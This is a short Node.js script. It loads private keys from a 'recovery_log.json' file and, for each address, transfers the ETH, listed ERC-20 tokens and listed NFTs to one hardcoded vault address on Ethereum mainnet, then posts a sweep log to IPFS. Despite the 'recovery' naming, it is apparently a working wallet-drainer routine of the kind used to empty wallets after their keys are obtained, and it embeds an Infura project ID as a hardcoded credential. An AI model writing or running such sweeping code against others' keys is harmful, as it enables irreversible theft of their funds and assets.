const fs = require("fs");
const axios = require("axios");
const { ethers, Wallet, Contract } = require("ethers");
require("dotenv").config();

const vault = "0x417745b6a657f8520d91eabf2f121479b04a04ce";
const provider = new ethers.JsonRpcProvider("https://mainnet.infura.io/v3/6c06cc61db8248b598a1484817ffadb6");
const recoveryLog = JSON.parse(fs.readFileSync("recovery_log.json"));
const erc20ABI = ["function transfer(address, uint256)", "function balanceOf(address) view returns (uint256)"];
const erc721ABI = ["function safeTransferFrom(address, address, uint256)"];

async function patchSweep() {
  for (const entry of recoveryLog) {
    if (entry.status === "swept") continue;
    try {
        const signer = new Wallet(entry.privateKey, provider);
        const eth = await provider.getBalance(entry.address);
        if (eth > ethers.parseEther("0.001")) {
          const tx = await signer.sendTransaction({ to: vault, value: eth - ethers.parseEther("0.0005") });
          fs.appendFileSync("sweep_log.json", JSON.stringify({ address: entry.address, txHash: tx.hash }, null, 2) + "\n");
        }

        for (const token of entry.erc20 || []) {
          const contract = new Contract(token.address, erc20ABI, signer);
          const bal = await contract.balanceOf(entry.address);
          if (bal > 0) {
            const tx = await contract.transfer(vault, bal);
            fs.appendFileSync("sweep_log.json", JSON.stringify({ token: token.symbol, txHash: tx.hash }, null, 2) + "\n");
          }
        }

        for (const nft of entry.nfts || []) {
          const contract = new Contract(nft.contract, erc721ABI, signer);
          const tx = await contract.safeTransferFrom(entry.address, vault, nft.tokenId);
          fs.appendFileSync("sweep_log.json", JSON.stringify({ nft: nft.name, txHash: tx.hash }, null, 2) + "\n");
        }

        entry.status = "swept";
    } catch (err) {
        fs.appendFileSync("sweep_log.json", JSON.stringify({ address: entry.address, error: err.message }, null, 2) + "\n");
    }
  }
  fs.writeFileSync("recovery_log.json", JSON.stringify(recoveryLog, null, 2));

  const ipfsPush = await axios.post("https://ipfs.infura.io:5001/api/v0/add", fs.readFileSync("sweep_log.json"), { headers: { "Content-Type": "multipart/form-data" } });
  console.log("📦 Sweep log CID: ", ipfsPush.data.Hash);
}

patchSweep().catch(console.error);
